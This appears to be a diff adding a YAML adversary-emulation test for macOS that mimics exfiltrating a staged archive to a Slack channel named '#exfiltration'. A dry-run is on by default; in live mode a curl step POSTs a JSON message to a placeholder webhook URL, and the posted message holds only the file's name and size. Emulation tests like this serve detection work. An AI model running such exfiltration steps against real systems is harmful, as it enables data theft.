@@ -1,0 +1,141 @@
+id: 014-slack-file-upload
+name: Slack File Upload
+description: Exfiltrates data by uploading files to Slack via webhook or API
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: b4c5d6e7-f8a0-4091-a2b3-c4d5e6f7a8b9
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  file_path:
+    description: File to upload to Slack
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  slack_webhook_url:
+    description: Slack incoming webhook URL
+    type: string
+    default: "https://hooks.slack.com/services/T00000000/B00000000/XXXX"
+  slack_channel:
+    description: Target Slack channel
+    type: string
+    default: "#exfiltration"
+  message_text:
+    description: Message text with file
+    type: string
+    default: "Exfiltrated data attached"
+  dry_run:
+    description: Enable dry-run mode
+    type: string
+    default: "true"
+steps:
+  - name: Verify file exists
+    type: command
+    executor: bash
+    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    cleanup: false
+  
+  - name: Prepare file for Slack
+    type: command
+    executor: bash
+    command: |
+      echo "Slack Upload Configuration:"
+      echo "  File: $(basename '{{ args.file_path }}')"
+      echo "  Size: $(du -h '{{ args.file_path }}' | cut -f1)"
+      echo "  Channel: {{ args.slack_channel }}"
+      echo "  Message: {{ args.message_text }}"
+    cleanup: false
+  
+  - name: Convert to base64 for transmission
+    type: command
+    executor: bash
+    command: |
+      echo "File encoding:"
+      encoded_size=$(base64 < '{{ args.file_path }}' | wc -c)
+      echo "  Encoded size: $encoded_size bytes"
+    cleanup: false
+  
+  - name: Upload to Slack
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        echo "DRY RUN: Slack File Upload"
+        echo "Webhook: {{ args.slack_webhook_url }}"
+        echo "Channel: {{ args.slack_channel }}"
+        echo "File: $(basename '{{ args.file_path }}')"
+        echo ""
+        echo "Payload would contain:"
+        echo "  - Message: {{ args.message_text }}"
+        echo "  - File attachment (base64 encoded)"
+        echo "  - File size: $(du -h '{{ args.file_path }}' | cut -f1)"
+      else
+        # Create JSON payload with base64 encoded file
+        json_payload=$(cat <<JSON_END
+{
+  "channel": "{{ args.slack_channel }}",
+  "text": "{{ args.message_text }}",
+  "attachments": [
+    {
+      "fallback": "File Upload",
+      "title": "$(basename '{{ args.file_path }}')",
+      "text": "File size: $(du -h '{{ args.file_path }}' | cut -f1)"
+    }
+  ]
+}
+JSON_END
+        )
+        
+        curl -X POST \
+          -H 'Content-type: application/json' \
+          --data "$json_payload" \
+          '{{ args.slack_webhook_url }}'
+      fi
+    cleanup: false
+checks:
+  - name: File readable
+    description: Verify file for upload
+    type: command
+    command: test -r '{{ args.file_path }}'
+  
+  - name: Valid webhook URL
+    description: Verify Slack webhook URL format
+    type: command
+    command: echo '{{ args.slack_webhook_url }}' | grep -qE 'hooks\.slack\.com' && echo "Valid webhook"
+tests:
+  dry_run:
+    - name: Test Slack upload (dry-run)
+      description: Test Slack file upload
+      type: basic
+      steps:
+        - name: Create test file
+          type: command
+          executor: bash
+          command: echo "Slack exfiltration test" > /tmp/test_slack.dat
+        
+        - name: Prepare Slack payload
+          type: command
+          executor: bash
+          command: |
+            cat > /tmp/slack_payload.json << 'JSON'
+{
+  "channel": "#exfiltration",
+  "text": "Test data upload",
+  "attachments": [
+    {"title": "test_slack.dat", "text": "Size: 23B"}
+  ]
+}
+JSON
+        
+        - name: Show payload
+          type: command
+          executor: bash
+          command: cat /tmp/slack_payload.json
+cleanup:
+  - name: Remove test files
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_slack.dat /tmp/slack_payload.json
+    ignore_errors: true
